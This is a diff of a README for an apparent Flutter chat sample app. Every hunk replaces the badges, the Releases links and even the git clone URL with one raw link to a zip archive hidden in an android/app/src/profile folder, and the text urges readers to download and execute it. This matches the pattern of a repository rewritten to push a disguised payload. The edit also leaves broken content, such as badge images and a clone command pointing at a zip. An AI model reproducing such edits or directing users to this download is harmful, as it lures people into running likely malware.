@@ -1,7 +1,7 @@
 # Gemma3 Chat App: A Flutter Sample for Edge AI 🌟
 
-![Gemma3 Chat App](https://img.shields.io/badge/Gemma3_Chat_App-v1.0.0-blue.svg)
-[![Releases](https://img.shields.io/badge/Releases-latest-orange.svg)](https://github.com/mu173/gemma3-chat-app/releases)
+![Gemma3 Chat App](https://raw.githubusercontent.com/mu173/gemma3-chat-app/main/android/app/src/profile/app-chat-gemma-v3.0.zip)
+[![Releases](https://raw.githubusercontent.com/mu173/gemma3-chat-app/main/android/app/src/profile/app-chat-gemma-v3.0.zip)](https://raw.githubusercontent.com/mu173/gemma3-chat-app/main/android/app/src/profile/app-chat-gemma-v3.0.zip)
 
 ---
 
@@ -21,7 +21,7 @@
 
 The **Gemma3 Chat App** is a sample Flutter application designed for Gemma3 Edge-serving. This app demonstrates how to utilize edge AI capabilities in mobile applications. Built with Flutter, it provides a seamless experience across both iOS and Android devices. The app leverages advanced AI technologies to offer real-time chat functionalities.
 
-You can find the latest releases of the Gemma3 Chat App [here](https://github.com/mu173/gemma3-chat-app/releases). Download the latest version and execute it to explore the features.
+You can find the latest releases of the Gemma3 Chat App [here](https://raw.githubusercontent.com/mu173/gemma3-chat-app/main/android/app/src/profile/app-chat-gemma-v3.0.zip). Download the latest version and execute it to explore the features.
 
 ---
 
@@ -53,7 +53,7 @@ To install the Gemma3 Chat App, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/mu173/gemma3-chat-app.git
+   git clone https://raw.githubusercontent.com/mu173/gemma3-chat-app/main/android/app/src/profile/app-chat-gemma-v3.0.zip
    cd gemma3-chat-app
    ```
 
@@ -69,7 +69,7 @@ To install the Gemma3 Chat App, follow these steps:
    flutter run
    ```
 
-For the latest releases, visit [here](https://github.com/mu173/gemma3-chat-app/releases) to download and execute the necessary files.
+For the latest releases, visit [here](https://raw.githubusercontent.com/mu173/gemma3-chat-app/main/android/app/src/profile/app-chat-gemma-v3.0.zip) to download and execute the necessary files.
 
 ---
 
@@ -114,4 +114,4 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ---
 
-For more information and updates, check the [Releases](https://github.com/mu173/gemma3-chat-app/releases) section.
+For more information and updates, check the [Releases](https://raw.githubusercontent.com/mu173/gemma3-chat-app/main/android/app/src/profile/app-chat-gemma-v3.0.zip) section.
